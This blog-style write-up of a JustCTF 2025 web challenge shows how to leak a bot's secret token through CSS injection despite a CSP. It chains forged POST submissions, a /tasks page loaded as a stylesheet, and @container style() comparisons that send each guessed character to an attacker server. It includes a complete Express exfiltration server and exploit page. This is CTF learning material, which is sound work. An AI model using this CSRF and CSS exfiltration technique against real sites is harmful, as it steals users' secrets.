
---
author: Michail Solovev
pubDatetime: 2025-08-07T15:22:00Z
modDatetime: 2025-08-07T16:52:45.934Z
title: JustCTF 2025 simple task
slug: just-theme-simpletask
featured: false
draft: false
tags:
  - writeup
description:
  JustCTF task writeup leak data via css.
---
A convenient feature I overlooked is functionality like:

```
<pre><% const preview=task.tasks.join(",\n"); %><%= preview.length>500? preview.slice(0, 500) + "..." : preview %></pre>
```

If the total length of tasks exceeds 500 characters, they are truncated with an ellipsis.

For example, two tasks look like:

```
<pre>asd,
justToken{asdasdasdasdasdasd0ew90w9ef}</pre>
```

Padded to 500 characters, it becomes:

```
<pre>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,
j...</pre>
```

`qwe` becomes `q…`.

The site is well-protected against XSS. All pages have a CSP like:

```
res.setHeader("Content-Security-Policy", `script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'`);
```

The note preview page has:

```
res.set("Content-Type", "text/html; charset=utf-8");
res.setHeader("Content-Security-Policy", `script-src 'none'`);
```

Thus, attempting XSS via UTF-16 encoding or a meta-tag with charset won't work (browsers prioritize the server-specified charset). Known CSP bypasses are also ineffective.

A friend pointed out the research at https://nzt-48.org/form-action-content-security-policy-bypass-and-other-tactics-for-dealing-with-the-csp, describing CSP bypasses via dangling markup. However, this is inapplicable here, as the templating engine prevents HTML injection on the `/tasks` page.

As a POC, I first try to partially replicate the author's exploit and guess one character of the bot's token.

Unlike typical CTF tasks, the bot can navigate to any URL, not just the task's origin.

The task lacks CSRF protection or an `X-Frame-Options` header, allowing external access to the page.

By the time the bot visits our provided link, it has already created a note with the flag. Following the exploit, we:

- Make the bot create another note with our controlled text. We could use `fetch`, but the browser complains about missing CORS headers in the response, intentionally causing an error and preventing response reading. So, we use a form:

```
<form 
  action="http://127.0.0.1:3000/tasks/0" 
  method="POST" 
  id="form">
    <textarea name="content"></textarea>
</form>
<script>
  window.onload = async () => {
    form.content.value='asd';
    form.submit();
  }
</script>
```

We send a payload like:

```
let flag = 'justToken{'      
const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${window.origin}/css/${flag}>}`;
const task = `${prev}${'a'.repeat(500 - flag.length - 12 - prev.length)}{}*{--x:`;
```

```
<form 
  action="http://127.0.0.1:3000/tasks/0" 
  method="POST" 
  target="chall"
  id="form">
    <textarea name="content"></textarea>
</form>
<script>
  window.onload = async () => {
    let flag = 'justToken{'      
    const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${window.origin}/css>}`;
    const task = `${prev}${'a'.repeat(500 - flag.length - 12 - prev.length)}{}*{--x:`;
    form.content.value=task;
    form.submit();
  }
</script>
```

If testing locally, allow pop-ups to prevent the server response from redirecting to `/tasks` and to open a new tab, keeping the exploit running. The task page HTML will look like:

```
<td>
    <pre>
&lt;link rel=stylesheet href=/tasks&gt;&lt;link rel=stylesheet href=http://127.0.0.1:5001/css&gt;}aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{}*{--x:,
justToken{as...
    </pre>
</td>
```

Next, open this note with:

```
open(`${CHALL_URL}/tasks/preview/0/0`, 'prev');
```

Since our note is the latest, it opens at index 0/0.

Visiting `http://127.0.0.1:3000/tasks/preview/0/0?`, DevTools shows `/tasks` loaded as a CSS style via `<link rel=stylesheet href=/tasks>`.

As the browser loads HTML as a style, it ignores everything except valid CSS:

```
*{--x:,
justToken{ab...</pre>
        </td>
      </tr>
      
  </table>

  <form method="POST" action="/tasks/create">
    <button class="btn" type="submit">Create New Task</button>
  </form>

</body>

</html>
```

This defines a custom CSS property `x` with a comma and the token's start.

The second style, loaded on our page, guesses the token's first characters by comparing CSS properties:

```
<link rel=stylesheet href=http://127.0.0.1:5001/css>
```

Loads:

```
/css
@import "/var/a";
@container style(--x:var(--y)){
  body{
    background: red url('/leak/justToken{a');
  }
}

/var/a
*{--y:,
justToken{ab...</pre>
        </td>
      </tr>
      
  </table>

  <form method="POST" action="/tasks/create">
    <button class="btn" type="submit">Create New Task</button>
  </form>

</body>

</html>
```

When `--x` and `--y` match, a request is made to our server.

This enables leaking one character; now, automate it.

#### Exploit

```
const express = require('express');

const app = express();
const PORT = 5001;

const charset = '0123456789abcdefghijklmnopqrstuvwxyz'

flag = 'justToken{'

app.get('/css', (req, res) => {
  res.set('content-type', 'text/css');
  result = "";
  for (const v in charset){
    result += `@import "/var/y_${charset[v]}";\n`
  }
  for (const v in charset){
    result += `@container style(--x:var(--y_${charset[v]})){
  body{
    background: red url('/leak/${flag}${charset[v]}');
  }
}\n`;
  }
  res.send(result);
});

app.get('/exploit', (req, res) => {
  res.sendFile(__dirname + '/exploit.html');
});
app.get('/var/:id', (req, res)=>{
  res.set('content-type', 'text/css');
  v = req.params.id.split('_')[1]
  data = `,
${flag}${v}...</pre>
        </td>
      </tr>
      
  </table>

  <form method="POST" action="/tasks/create">
    <button class="btn" type="submit">Create New Task</button>
  </form>

</body>

</html>`
  const variableTpl = `*{--${req.params.id}:${data}`;
  res.send(variableTpl);
});

app.get('/tasks', (req, res) => {
  res.sendFile(__dirname + '/tasks.html');
});
app.get('/leak/:flag', (req, res) =>{
  flag = req.params.flag;
  console.log(req.params.flag)
  res.send('ok');
})
app.get('/poll', async (req, res) => {
  res.send(flag);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
```

**exploit.html**

```
<script>
CHALL_URL = 'http://127.0.0.1:3000';
</script>

<!-- Hide iframe but use it as target -->
<iframe name="chall" style="display:none;" id="challFrame"></iframe>

<form 
  action="http://127.0.0.1:3000/tasks/0" 
  method="POST" 
  target="chall"
  id="form">
  <textarea name="content"></textarea>
</form>

<script>
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

window.onload = async () => {
  let flag = 'justToken{';
  for(let i=0; i<3; i++){

    const prev = `<link rel=stylesheet href=/tasks><link rel=stylesheet href=${window.origin}/css>}`;
    const task = `${prev}${'a'.repeat(500 - flag.length - 11 - prev.length)}{}*{--x:`;
    
    form.content.value = task;
    
    // Wait for iframe to load after form submission
    const iframe = document.getElementById('challFrame');
    
    const loadPromise = new Promise((resolve) => {
        iframe.onload = () => {
        console.log("Page in iframe loaded");
        resolve();
        };
        // Handle errors
        iframe.onerror = () => {
        console.error("Iframe loading error");
        resolve(); // Prevent hanging
        };
    });

    // Submit form
    form.submit();

    // Wait for iframe to load
    await loadPromise;
    await sleep(1010); // Small delay for safety

    // Perform remaining actions
    open(`${CHALL_URL}/tasks/preview/0/0`, 'prev');
    await sleep(1010);
    flag = await fetch('/poll').then(e=>e.text());
    console.log(flag);
    open(`${CHALL_URL}/tasks/delete/0/0`, 'prev');
    await sleep(1010);
   }
}
</script>
```